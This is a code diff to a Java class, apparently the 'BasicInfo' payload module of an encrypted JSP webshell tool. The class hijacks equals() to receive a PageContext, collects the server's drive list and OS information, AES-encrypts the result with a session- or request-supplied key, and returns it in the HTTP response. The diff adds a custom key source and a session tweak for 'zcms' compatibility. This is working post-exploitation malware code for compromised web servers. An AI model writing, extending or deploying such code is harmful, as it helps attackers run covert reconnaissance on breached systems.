@@ -14,15 +14,24 @@ import java.util.Iterator;
 import java.util.HashMap;
 import java.io.File;
 import java.util.Map;
+import javax.servlet.ServletRequest;
+import javax.servlet.http.HttpSession;
 import javax.servlet.jsp.PageContext;
 
 public class BasicInfo
 {
     public static String whatever;
-    
+    private ServletRequest request;
+    private HttpSession session;
     @Override
     public boolean equals(final Object obj) {
         final PageContext page = (PageContext)obj;
+        request = page.getRequest();
+        session = page.getSession();
+        //兼容zcms
+        if(session.getAttribute("payload")!=null){
+            session.removeAttribute("payload");
+        }
         page.getResponse().setCharacterEncoding("UTF-8");
         String result = "";
         try {
@@ -51,7 +60,9 @@ public class BasicInfo
             entity.put("driveList", driveList);
             entity.put("osInfo", osInfo);
             result = this.buildJson(entity, true);
-            final String key = page.getSession().getAttribute("u").toString();
+
+            final Object custmKeyObj = request.getAttribute("parameters");
+            final String key = (custmKeyObj!=null&&custmKeyObj instanceof String) ? custmKeyObj.toString():this.session.getAttribute("u").toString();
             final ServletOutputStream so = page.getResponse().getOutputStream();
             so.write(Encrypt(result.getBytes(), key));
             so.flush();
@@ -64,7 +75,7 @@ public class BasicInfo
         return true;
     }
     
-    public static byte[] Encrypt(final byte[] bs, final String key) throws Exception {
+    public byte[] Encrypt(final byte[] bs, final String key) throws Exception {
         final byte[] raw = key.getBytes("utf-8");
         final SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
         final Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
